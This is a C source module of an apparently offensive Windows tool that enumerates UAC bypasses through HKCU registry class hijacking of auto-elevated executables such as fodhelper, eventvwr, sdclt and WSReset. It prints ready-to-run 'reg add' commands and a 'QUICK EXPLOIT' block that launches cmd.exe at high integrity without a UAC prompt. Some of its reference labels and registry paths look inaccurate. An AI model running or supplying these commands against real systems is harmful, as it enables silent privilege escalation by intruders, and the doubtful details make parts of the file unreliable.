/*
 * uac_bypass_hkcu.c — UAC Bypass via HKCU Registry Class Hijacking
 *
 * ATTACK CLASS (different from COM auto-elevation):
 *   Several Windows built-in executables run as auto-elevated (High IL)
 *   but read shell handler / URI handler registrations from HKCU BEFORE HKLM.
 *   Since HKCU is always writable by the current user, a Medium-IL attacker
 *   can override these keys to redirect execution to an arbitrary payload.
 *
 *   Unlike COM auto-elevation (--COMELE), these are regular EXE-based UAC bypasses
 *   that don't require any COM interface manipulation.
 *
 * HOW IT WORKS:
 *   1. Target EXE is auto-elevated (requestedExecutionLevel=requireAdministrator
 *      or marked as auto-elevate in appinfo.dll whitelist)
 *   2. The EXE reads a registry key from HKCU\Software\Classes\<something>\
 *      to determine what to execute (shell\open\command, or similar)
 *   3. Attacker sets that HKCU key to point to their payload BEFORE running the EXE
 *   4. EXE elevates to High IL and executes attacker's payload
 *
 * KNOWN BYPASS VECTORS (as of Windows 10/11):
 *
 *  fodhelper.exe / computerdefaults.exe:
 *    Reads: HKCU\Software\Classes\ms-settings\shell\open\command
 *            HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute
 *
 *  eventvwr.exe (Event Viewer):
 *    Reads: HKCU\Software\Classes\mscfile\shell\open\command
 *
 *  sdclt.exe (Backup and Restore):
 *    Reads: HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe
 *           OR HKCU\Software\Classes\exefile\shell\open\command
 *
 *  cmstp.exe (Connection Manager Profile Installer):
 *    Reads: HKCU\Software\Classes\ms-settings\shell\open\command (via .inf)
 *    Uses DelegateExecute trick
 *
 *  slui.exe (Software Licensing UI):
 *    Reads: HKCU\Software\Classes\<elevated-file-type-handler>
 *
 *  dccw.exe (Display Color Calibration):
 *    Reads: HKCU\Software\Classes\.msc → IColorDataProxy (COM, but via HKCU)
 *
 *  WSReset.exe (Windows Store Reset):
 *    Reads: HKCU\Software\Classes\AppX82a6gwre4fdg3ha4...\Shell\open\command
 *    Execute whatever is in that command key
 *
 *  SystemPropertiesXxx.exe:
 *    Read HKCU PATH → DLL search order hijack in High-IL context
 *
 * DETECTION:
 *   For each known bypass target:
 *   1. Check if the EXE exists on this system
 *   2. Check if the HKCU override key already exists (someone else set it?)
 *   3. Verify the EXE is actually in the auto-elevation whitelist
 *   4. Report which bypasses are applicable to THIS system
 *
 * NOTES:
 *   - Windows 11 22H2+ has patched several of these
 *   - fodhelper is the most reliable across Win10/11 versions
 *   - WSReset is reliable on Win10 1903+ through Win11 22H2
 *   - Always test on the exact target Windows build
 *
 * REFERENCES:
 *   - egre55 fodhelper bypass: https://egre55.github.io/system-properties-uac-bypass/
 *   - UACMe project: https://github.com/hfiref0x/UACME (41+ techniques)
 *   - MITRE ATT&CK: T1548.002 — Bypass User Account Control
 */

#include "../common.h"

typedef struct {
    const wchar_t *exeName;      /* auto-elevated EXE filename */
    const wchar_t *exeRelPath;   /* relative to System32 or SysWOW64 */
    const wchar_t *hkcuKey;      /* HKCU subkey to override */
    const wchar_t *hkcuValue;    /* value name (NULL = default) */
    const wchar_t *delegateKey;  /* optional DelegateExecute key */
    const wchar_t *notes;
} UACBypassVector;

static const UACBypassVector g_vectors[] = {
    {
        L"fodhelper.exe",
        L"fodhelper.exe",
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        NULL, /* default value */
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        L"Most reliable Win10/11 bypass. Set default value to cmd.exe, "
        L"create DelegateExecute (empty string) to force ShellExecute elevation."
    },
    {
        L"computerdefaults.exe",
        L"computerdefaults.exe",
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        NULL,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        L"Same ms-settings hijack as fodhelper. Works on Win10 1607+."
    },
    {
        L"eventvwr.exe",
        L"eventvwr.exe",
        L"Software\\Classes\\mscfile\\shell\\open\\command",
        NULL,
        NULL,
        L"Event Viewer reads mscfile handler. Set default value to cmd.exe. "
        L"Reliable Win7-Win10 but patched in some Win11 builds."
    },
    {
        L"sdclt.exe",
        L"sdclt.exe",
        L"Software\\Classes\\exefile\\shell\\runas\\command",
        NULL,
        NULL,
        L"Backup/Restore UI. Reads exefile handler for shell::: launcher. "
        L"Also: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"
    },
    {
        L"WSReset.exe",
        L"WSReset.exe",
        L"Software\\Classes\\AppX82a6gwre4fdg3ha4gy220dv9gg9qv9q89\\Shell\\open\\command",
        NULL,
        NULL,
        L"Windows Store Reset. Reads AppX shell handler from HKCU. "
        L"Set default value to payload path. Reliable Win10 1903–Win11 21H2."
    },
    {
        L"cmstp.exe",
        L"cmstp.exe",
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        NULL,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        L"Connection Manager Profile Installer. Can execute arbitrary code "
        L"via crafted .inf file + ms-settings class hijack."
    },
    {
        L"dccw.exe",
        L"dccw.exe",
        L"Software\\Classes\\.msc\\shell\\open\\command",
        NULL,
        NULL,
        L"Display Color Calibration Wizard. Reads .msc file association. "
        L"Override in HKCU\\Software\\Classes\\.msc to redirect."
    },
    { NULL, NULL, NULL, NULL, NULL, NULL }
};

/* -----------------------------------------------------------------------
 * Check one bypass vector
 * --------------------------------------------------------------------- */
static void AuditBypassVector(const UACBypassVector *v, DWORD *findings) {
    /* Check if the EXE exists */
    wchar_t sys32[MAX_PATH] = {0};
    GetSystemDirectoryW(sys32, _countof(sys32));
    wchar_t exeFull[MAX_PATH * 2] = {0};
    _snwprintf(exeFull, _countof(exeFull), L"%s\\%s", sys32, v->exeRelPath);

    BOOL exeExists = (GetFileAttributesW(exeFull) != INVALID_FILE_ATTRIBUTES);
    if (!exeExists) return; /* EXE not on this system */

    /* Check if HKCU override key already exists */
    HKEY hKey = NULL;
    BOOL keyExists = (RegOpenKeyExW(HKEY_CURRENT_USER, v->hkcuKey,
                                    0, KEY_READ, &hKey) == ERROR_SUCCESS);
    wchar_t existingVal[MAX_PATH * 2] = {0};
    BOOL hasValue = FALSE;

    if (keyExists) {
        DWORD cb = sizeof(existingVal), type = 0;
        hasValue = (RegQueryValueExW(hKey, v->hkcuValue, NULL, &type,
                                     (LPBYTE)existingVal, &cb) == ERROR_SUCCESS);
        RegCloseKey(hKey);
    }

    Finding f;
    f.severity = SEV_HIGH;
    wcscpy(f.module, L"UACBYPASS");

    if (hasValue && *existingVal) {
        /* Key already set — either by legit software or prior attack */
        f.severity = SEV_CRITICAL;
        _snwprintf(f.target, _countof(f.target),
            L"[ALREADY SET] %s → HKCU\\%s",
            v->exeName, v->hkcuKey);
        _snwprintf(f.reason, _countof(f.reason),
            L"UAC bypass HKCU key ALREADY EXISTS with value: %s\n"
            L"        %s reads this HKCU key and executes it at HIGH IL.\n"
            L"        If this value was not set by a legitimate program → "
            L"prior compromise or misconfiguration.\n"
            L"        Current override: '%s'\n"
            L"        %s",
            existingVal, v->exeName, existingVal, v->notes);
    } else {
        /* Key doesn't exist / no value → we can set it */
        _snwprintf(f.target, _countof(f.target),
            L"[APPLICABLE] %s UAC bypass via HKCU\\%s",
            v->exeName, v->hkcuKey);
        _snwprintf(f.reason, _countof(f.reason),
            L"Auto-elevated EXE '%s' exists and reads HKCU class override.\n"
            L"        Attack:\n"
            L"          reg add \"HKCU\\%s\" /d \"C:\\payload.exe\" /f\n"
            L"          %s%s\n"
            L"          %s\n"
            L"        Then run: %s\\%s\n"
            L"        Result: payload.exe runs at HIGH IL (no UAC prompt).\n"
            L"        %s",
            v->exeName,
            v->hkcuKey,
            v->delegateKey ? L"reg add \"HKCU\\" : L"",
            v->delegateKey ? v->delegateKey : L"",
            v->delegateKey ? L"\" /v DelegateExecute /d \"\" /f" : L"",
            sys32, v->exeName,
            v->notes);
    }

    PrintFinding(&f);
    (*findings)++;
}

void Module_UACBypassHKCU(void) {
    PrintHeader(L"UAC BYPASS — HKCU CLASS HIJACK  [Auto-elevated EXE + HKCU override]");

    PrintInfo(
        L"  Enumerates auto-elevated Windows EXEs that read HKCU shell/class handlers.\n"
        L"  Since HKCU is always user-writable, Medium-IL attacker can redirect execution.\n"
        L"  Different from --COMELE: no COM interface needed, just registry manipulation.\n\n");

    DWORD findings = 0;
    for (int i = 0; g_vectors[i].exeName; i++)
        AuditBypassVector(&g_vectors[i], &findings);

    PrintInfo(L"\n  Bypass vectors checked: %d  |  Applicable on this system: %lu\n\n",
              (int)(sizeof(g_vectors)/sizeof(g_vectors[0])) - 1,
              findings);

    PrintInfo(
        L"  QUICK EXPLOIT (fodhelper.exe):\n"
        L"    cmd /c \"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \\\"cmd.exe\\\" /f\"\n"
        L"    cmd /c \"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /d \\\"\\\" /f\"\n"
        L"    Start-Process C:\\Windows\\System32\\fodhelper.exe\n"
        L"    # cmd.exe opens at High IL\n\n"
        L"  CLEANUP:\n"
        L"    reg delete HKCU\\Software\\Classes\\ms-settings /f\n\n"
        L"  REFERENCE: UACMe project (hfiref0x) — 41+ documented bypass techniques\n"
        L"    https://github.com/hfiref0x/UACME\n");
}
